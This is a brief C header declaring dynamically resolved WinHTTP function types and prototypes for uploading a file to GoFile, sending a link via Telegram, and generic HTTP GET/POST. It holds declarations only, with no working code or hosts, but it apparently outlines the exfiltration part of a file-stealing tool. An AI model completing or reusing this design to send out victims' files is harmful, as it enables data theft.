#include <windows.h>

typedef HINTERNET (WINAPI *WinHttpOpenFunc)               (LPCWSTR   pszAgentW, DWORD dwAccessType,     LPCWSTR pszProxyW,           LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET (WINAPI *WinHttpConnectFunc)            (HINTERNET hSession,  LPCWSTR pswzServerName, INTERNET_PORT nServerPort,   DWORD dwReserved);
typedef HINTERNET (WINAPI *WinHttpOpenRequestFunc)        (HINTERNET hConnect,  LPCWSTR pwszVerb,       LPCWSTR pwszObjectName,      LPCWSTR pwszVersion,     LPCWSTR pwszReferrer,     LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL      (WINAPI *WinHttpSendRequestFunc)        (HINTERNET hRequest,  LPCWSTR pwszHeaders,    DWORD dwHeadersLength,       LPVOID lpOptional,       DWORD dwOptionalLength,   DWORD dwTotalLength,       DWORD_PTR dwContext);
typedef BOOL      (WINAPI *WinHttpReceiveResponseFunc)    (HINTERNET hRequest,  LPVOID lpReserved);
typedef BOOL      (WINAPI *WinHttpReadDataFunc)           (HINTERNET hRequest,  LPVOID lpBuffer,        DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL      (WINAPI *WinHttpCloseHandleFunc)        (HINTERNET hInternet);
typedef BOOL      (WINAPI *WinHttpQueryHeadersFunc)       (HINTERNET hRequest,  DWORD dwInfoLevel,      LPCWSTR pwszName,            LPVOID lpBuffer,         LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef BOOL      (WINAPI *WinHttpQueryDataAvailableFunc) (HINTERNET hRequest,  LPDWORD lpdwNumberOfBytesAvailable);
typedef BOOL      (WINAPI *WinHttpAddRequestHeadersFunc)  (HINTERNET hRequest,  LPCWSTR lpszHeaders,    DWORD dwHeadersLength,       DWORD dwModifiers);

int UploadGoFile                                          (char* pLink, char* FileToUpload, char* BestServer);
int HTTP_POST                                             (char *response, WCHAR *domain, WCHAR *path, char *body, WCHAR *contentType);
int HTTP_GET                                              (char *response, WCHAR *domain, WCHAR *path);
int SendTelegram                                          (char *Link);
int GetGoFileServer                                       (char *Server);
